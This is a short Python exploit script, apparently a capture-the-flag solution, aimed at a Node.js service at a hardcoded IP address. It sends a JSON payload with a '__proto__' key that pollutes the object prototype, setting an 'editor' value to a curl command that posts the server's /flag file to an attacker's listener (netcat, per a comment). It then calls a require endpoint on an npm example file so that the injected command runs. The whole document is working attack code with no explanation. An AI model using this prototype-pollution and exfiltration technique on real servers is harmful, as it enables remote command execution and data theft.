import requests

#prepare a public web server
#nc -lvp port
#yourPublicIP:port

url="http://34.136.219.163:32002"
json={
    "merge1":{"1":"a"},
    "merge2": {
        "__proto__": {
            "editor": "curl -d @/flag yourPublicIP:port" 
        }
    }
}
print(requests.post(url+'/api/merge',json=json).text)
print(requests.post(url+'/api/require',data={'requirethis':'/usr/local/lib/node_modules/npm/node_modules/editor/example/edit.js'}).text)